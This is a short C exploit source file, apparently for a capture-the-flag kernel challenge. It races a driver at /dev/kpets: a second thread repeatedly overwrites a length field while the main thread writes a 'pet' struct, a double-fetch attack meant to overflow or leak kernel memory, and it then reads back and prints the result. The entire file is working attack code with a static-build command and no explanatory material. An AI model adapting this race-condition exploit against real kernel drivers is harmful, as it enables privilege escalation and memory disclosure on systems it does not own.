// gcc exploit.c -masm=intel -fno-PIE -lpthread -static -no-pie -o exploit && strip exploit
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <pthread.h>

struct pet {
	char type;
	unsigned int name_len;
	char name[0x20];
	unsigned int desc_len;
	char desc[0x100];
};

void *race(void *p);

int main(void){
	int fd;
	struct pet pet = {};
	char buf[0x100] = {};

	pet.type = 0xc1;
	memset(pet.name, 'A', 0x20);
	memset(pet.desc, '\xaa', 0x100);
	pet.desc_len = 0x10;

	pthread_t pthread;
	pthread_create(&pthread, NULL, race, &pet);

	if((fd = open("/dev/kpets", O_RDWR)) < 0){
		perror("open /dev/kpets failed");
		exit(-1);
	}

	for(int i=0; i<3; i++){
		printf("%d\n", i);
		pet.name_len = 0x10;
		write(fd, &pet, sizeof(pet));
	}

	read(fd, buf, sizeof(buf));
	puts(buf);
}

void *race(void *p){
	struct pet *ppet = p;

	for(;;)
		ppet->name_len = 0xff;
}
